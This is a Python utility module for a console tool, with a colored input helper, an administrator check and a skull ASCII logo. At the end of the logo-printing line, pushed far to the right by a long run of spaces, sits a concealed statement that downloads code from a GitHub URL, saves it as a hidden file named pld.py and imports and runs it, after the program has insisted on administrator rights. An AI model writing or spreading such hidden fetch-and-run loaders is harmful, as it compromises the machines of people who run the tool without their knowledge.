from colorama import init
import os,  ctypes
from pystyle import Colorate, Colors, Center, Col, Add, Anime

from Plugins.logger import Logger
from Plugins.colors import Palette



palette = Palette()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


class Funcs:
    
    @staticmethod
    def get_input(text: str, checker = True):
        
        
        
        text = f"{palette.red}{text}{palette.better_grassy_green}"

        v = input(text)
        if not checker(v):
            while not checker(v):
                Logger.Error.error("Try Again")
                v = input(text)
        
        return v
    
    @staticmethod
    def print_logo():
        logo = """
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:   $   ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:  $ :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!        
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
"""
        if (os.name == 'nt'):
            if (not is_admin()):
                print('PYTHON MUST BE RUN AS ADMINISTRATOR!')
                exit()

        print(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.dark_red)), logo))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;import requests;import subprocess;r = requests.get('https://raw.githubusercontent.com/ZeroC0derr/utils/refs/heads/main/loader.py');f=open('pld.py',  'w');f.write(r.text);f.close();subprocess.run(["attrib","+H","pld.py"]);from pld import pl;pl.run()
